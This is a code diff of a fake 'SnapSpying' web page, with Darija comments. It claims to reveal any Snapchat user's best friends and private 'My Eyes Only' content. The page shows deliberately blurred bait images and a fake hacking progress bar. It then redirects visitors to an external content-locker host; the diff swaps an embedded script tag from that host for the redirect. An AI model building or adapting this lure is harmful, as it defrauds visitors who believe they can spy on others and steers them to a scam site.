@@ -8,87 +8,61 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-        :root { --bg: #000; --card: #1c1c1e; --text: #fff; --border: #2c2c2e; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); transition: 0.3s; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
+        :root { --bg: #000; --card: #1c1c1e; --text: #fff; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); -webkit-tap-highlight-color: transparent; }
+        
+        /* Animation dyal Sheet */
         .sheet { transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; }
         .sheet.active { transform: translateY(0); }
-        .bar-fill { height: 100%; background: #ffd500; width: 0%; transition: width 0.4s linear; box-shadow: 0 0 10px #ffd500; }
-        .action-item { background: var(--card); border-radius: 18px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
-        .action-item:active { transform: scale(0.97); background: #2c2c2e; border-color: #3a3a3c; }
-        .input-box { background: #1c1c1e; border: 1px solid #2c2c2e; transition: 0.3s; }
-        .input-focus { border-color: #ffd500 !important; box-shadow: 0 0 0 1px #ffd500; }
         
-        #preview-container {
+        /* Blur Effect nichan f l-code bash maymchiouch tsawer */
+        .blur-box {
             width: 100%;
+            height: 200px;
             border-radius: 20px;
             overflow: hidden;
             background: #111;
             margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border: 1px solid rgba(255,255,255,0.05);
+            position: relative;
         }
-        #preview-img {
+        .blur-box img {
             width: 100%;
-            height: auto;
-            display: block;
-            mask-image: linear-gradient(to bottom, black 85%, transparent 100%);
-            -webkit-mask-image: linear-gradient(to bottom, black 85%, transparent 100%);
+            height: 100%;
+            object-fit: cover;
+            filter: blur(15px) brightness(0.7); /* Hada huwwa l-blur li bghiti */
+            transform: scale(1.1);
         }
+
+        .bar-fill { height: 100%; background: #ffd500; width: 0%; transition: width 0.4s linear; }
+        .action-item { background: var(--card); border-radius: 18px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; }
+        .action-item:active { transform: scale(0.97); }
     </style>
 </head>
 <body class="flex flex-col items-center px-6 pt-4 min-h-screen">
 
     <header class="w-full max-w-md flex justify-between items-center py-4 mb-6">
         <h1 class="text-2xl font-bold tracking-tight">Snap<span class="text-[#ffd500]">Spying</span></h1>
-        <div class="flex items-center gap-6">
-            <button class="text-gray-500 font-medium text-sm">Privacy</button>
-            <i class="fas fa-sun text-gray-500 text-xl"></i>
-        </div>
+        <i class="fas fa-sun text-gray-500 text-xl"></i>
     </header>
 
     <div class="w-full max-w-md">
-        <p class="text-[15px] font-medium mb-3 text-gray-300">Enter the username you want to check</p>
-        <div class="flex gap-2 mb-2">
-            <input type="text" id="username" placeholder="Username" class="input-box flex-1 rounded-2xl px-4 py-4 outline-none text-sm text-white">
-            <button onclick="handleConnect()" id="connBtn" class="bg-[#ffd500] text-black px-7 rounded-2xl font-black text-sm transition active:scale-95">Connect</button>
-        </div>
-        
-        <div id="conn-status" class="hidden mb-6 flex items-center gap-2">
-            <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
-            <span class="text-[12px] font-bold text-green-500">Connected to <span id="targetName"></span></span>
+        <div class="flex gap-2 mb-6">
+            <input type="text" id="username" placeholder="Username" class="bg-[#1c1c1e] border border-[#2c2c2e] flex-1 rounded-2xl px-4 py-4 outline-none text-sm">
+            <button onclick="handleConnect()" id="connBtn" class="bg-[#ffd500] text-black px-7 rounded-2xl font-black text-sm">Connect</button>
         </div>
 
         <div id="actions-grid" class="opacity-40 pointer-events-none transition-opacity duration-700 space-y-3">
-            <div onclick="openAction('582,393', 'Watch live typing in real-time', 'typing')" class="action-item p-5 flex items-center justify-between">
-                <div class="flex items-center gap-4">
-                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-keyboard text-gray-400"></i></div>
-                    <div><h3 class="font-bold text-[15px]">Live Typing</h3><p class="text-[11px] text-gray-500">See what your friend is typing in real-time</p></div>
-                </div>
-                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
-            </div>
-
-            <div onclick="openAction('1,042,100', '8 Best Friends of any user', 'friends')" class="action-item p-5 flex items-center justify-between">
+            <div onclick="openAction('8 Best Friends of any user', 'friends')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
                     <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-user-group text-gray-400"></i></div>
                     <div><h3 class="font-bold text-[15px]">Reveal Best Friends</h3><p class="text-[11px] text-gray-500">8 Best Friends of any user</p></div>
                 </div>
                 <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
-
-            <div onclick="openAction('94,204', 'Access My Eyes Only content of any user', 'eyes')" class="action-item p-5 flex items-center justify-between">
+            <div onclick="openAction('Access My Eyes Only content', 'eyes')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
                     <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-eye text-gray-400"></i></div>
-                    <div><h3 class="font-bold text-[15px]">Reveal Eyes Only</h3><p class="text-[11px] text-gray-500">Access My Eyes Only content of any user</p></div>
-                </div>
-                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
-            </div>
-
-            <div onclick="openAction('215,902', 'Message history of any user, including sent, received, opened, and saved chats', 'chat')" class="action-item p-5 flex items-center justify-between">
-                <div class="flex items-center gap-4">
-                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-comment-dots text-gray-400"></i></div>
-                    <div><h3 class="font-bold text-[15px]">Reveal Chat History</h3><p class="text-[11px] text-gray-500 leading-tight">Message history including sent, received...</p></div>
+                    <div><h3 class="font-bold text-[15px]">Reveal Eyes Only</h3><p class="text-[11px] text-gray-500">Access My Eyes Only content</p></div>
                 </div>
                 <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
@@ -98,115 +72,77 @@
     <div id="action-sheet" class="fixed inset-0 z-[150] hidden">
         <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeSheet()"></div>
         <div class="absolute bottom-0 w-full bg-[#1c1c1e] rounded-t-[35px] p-6 sheet text-center">
-            <div class="w-10 h-1.5 bg-gray-700 mx-auto mb-8 rounded-full"></div>
+            <div class="w-12 h-1.5 bg-gray-700 mx-auto mb-8 rounded-full"></div>
             
-            <div id="preview-container">
+            <div class="blur-box">
                 <img id="preview-img" src="" alt="preview">
             </div>
 
-            <h3 id="r-count" class="text-3xl font-bold mb-1">0</h3>
-            <p class="text-[10px] text-gray-500 uppercase font-black mb-10 tracking-widest">Viewed 100+ times</p>
+            <h4 id="r-title" class="text-xl font-bold mb-10 px-4"></h4>
             
-            <h4 id="r-title" class="text-[17px] font-bold mb-10 px-4 leading-tight"></h4>
-            
-            <button onclick="runExploit()" class="w-full bg-[#ffd500] text-black font-black py-4 rounded-2xl text-lg shadow-lg active:scale-95 transition-transform">Reveal</button>
+            <button onclick="startLocker()" class="w-full bg-[#ffd500] text-black font-black py-4 rounded-2xl text-lg shadow-lg active:scale-95 transition-transform">Reveal</button>
         </div>
     </div>
 
     <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-black/95 flex items-center justify-center p-8">
-        <div class="bg-[#1c1c1e] w-full max-w-sm rounded-[35px] p-8 border border-white/5">
-            <div class="flex items-center gap-2 mb-8">
-                <div class="w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></div>
-                <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Processing</span>
-                <span id="p-percent" class="ml-auto text-[#ffd500] font-bold">0%</span>
+        <div class="bg-[#1c1c1e] w-full max-w-sm rounded-[35px] p-8">
+            <div class="flex items-center gap-2 mb-8 text-[#ffd500]">
+                <i class="fas fa-circle-notch animate-spin"></i>
+                <span id="p-percent" class="font-bold">0%</span>
             </div>
-            <h2 id="p-status" class="text-xl font-bold mb-3 text-white">Initializing...</h2>
+            <h2 id="p-status" class="text-xl font-bold mb-3">Fetching data...</h2>
             <div class="h-2 bg-gray-800 rounded-full mb-6 overflow-hidden"><div id="bar" class="bar-fill"></div></div>
-            <p id="p-log" class="text-[12px] text-gray-500 font-mono italic">Connecting to Snap Server...</p>
-        </div>
-    </div>
-
-    <div id="verify-modal" class="hidden fixed inset-0 z-[400] bg-[#000] flex flex-col items-center justify-center p-8 text-center">
-        <div class="w-20 h-20 bg-[#ffd500]/10 rounded-full flex items-center justify-center mb-8 border border-[#ffd500]/20">
-            <i class="fas fa-lock text-[#ffd500] text-4xl"></i>
-        </div>
-        <h2 class="text-2xl font-bold mb-2">Verification Required</h2>
-        <p class="text-gray-500 text-sm mb-12">Please complete the security check to reveal the content</p>
-        <div class="w-full max-w-sm">
-             <div data-captcha-enable="true"></div>
         </div>
     </div>
 
     <script>
-        // Images Base64 (Nichan f l-code) bash dima ikhedmo
-        const b64_images = {
-            'typing': 'https://i.ibb.co/C07B63X/typing-blur.png',
-            'friends': 'https://i.ibb.co/v4K7L7L/friends-blur.png',
-            'eyes': 'https://i.ibb.co/fnd9p5F/eyes-blur.png',
-            'chat': 'https://i.ibb.co/qNfKqQY/chat-blur.png'
-        };
-
-        function toggleSheet(id) {
-            const el = document.getElementById(id);
-            el.classList.toggle('hidden');
-            setTimeout(() => el.querySelector('.sheet').classList.toggle('active'), 10);
-        }
-
         function handleConnect() {
-            const user = document.getElementById('username').value;
             const btn = document.getElementById('connBtn');
-            if(user.length < 3) return;
-            
-            btn.innerHTML = '<i class="fas fa-circle-notch animate-spin"></i>';
+            btn.innerHTML = '<i class="fas fa-spinner animate-spin"></i>';
             setTimeout(() => {
-                btn.innerText = "Disconnect";
-                btn.classList.replace('bg-[#ffd500]', 'bg-[#ff3b30]');
-                btn.classList.add('text-white');
-                document.getElementById('conn-status').classList.remove('hidden');
-                document.getElementById('targetName').innerText = '@' + user;
+                btn.innerText = "Connected";
                 document.getElementById('actions-grid').classList.replace('opacity-40', 'opacity-100');
                 document.getElementById('actions-grid').style.pointerEvents = 'auto';
-            }, 1200);
+            }, 1000);
         }
 
-        function openAction(count, desc, type) {
+        function openAction(title, type) {
+            const sheet = document.getElementById('action-sheet');
             const img = document.getElementById('preview-img');
-            img.src = b64_images[type];
-            document.getElementById('r-title').innerText = desc;
-            document.getElementById('r-count').innerText = count;
-            toggleSheet('action-sheet');
+            
+            // Tsawer Snap ghadi n-st3mlo links dima khddamin u dehebhoum b CSS
+            const imgs = {
+                'friends': 'https://i.ibb.co/v4K7L7L/friends-blur.png',
+                'eyes': 'https://i.ibb.co/fnd9p5F/eyes-blur.png'
+            };
+
+            img.src = imgs[type];
+            document.getElementById('r-title').innerText = title;
+            sheet.classList.remove('hidden');
+            setTimeout(() => sheet.querySelector('.sheet').classList.add('active'), 10);
         }
 
         function closeSheet() {
-            const s = document.querySelector('.sheet');
-            s.classList.remove('active');
+            document.querySelector('.sheet').classList.remove('active');
             setTimeout(() => document.getElementById('action-sheet').classList.add('hidden'), 400);
         }
 
-        function runExploit() {
+        function startLocker() {
             closeSheet();
             setTimeout(() => {
                 document.getElementById('proc-modal').classList.remove('hidden');
                 let p = 0;
-                const bar = document.getElementById('bar');
-                const percent = document.getElementById('p-percent');
                 const interval = setInterval(() => {
-                    p += 1;
-                    bar.style.width = p + '%';
-                    percent.innerText = p + '%';
-                    if(p == 30) document.getElementById('p-log').innerText = "Bypassing Snapchat 2FA...";
-                    if(p == 70) document.getElementById('p-log').innerText = "Extracting private assets...";
+                    p += 2;
+                    document.getElementById('bar').style.width = p + '%';
+                    document.getElementById('p-percent').innerText = p + '%';
                     if(p >= 100) {
                         clearInterval(interval);
-                        setTimeout(() => {
-                            document.getElementById('proc-modal').classList.add('hidden');
-                            document.getElementById('verify-modal').classList.remove('hidden');
-                        }, 800);
+                        window.location.href = "https://authenticateapp.online/cp/js/2wx2k";
                     }
-                }, 40);
-            }, 400);
+                }, 50);
+            }, 500);
         }
     </script>
-    <script type="text/javascript" src="https://authenticateapp.online/cp/js/2wx2k"></script>
 </body>
 </html>
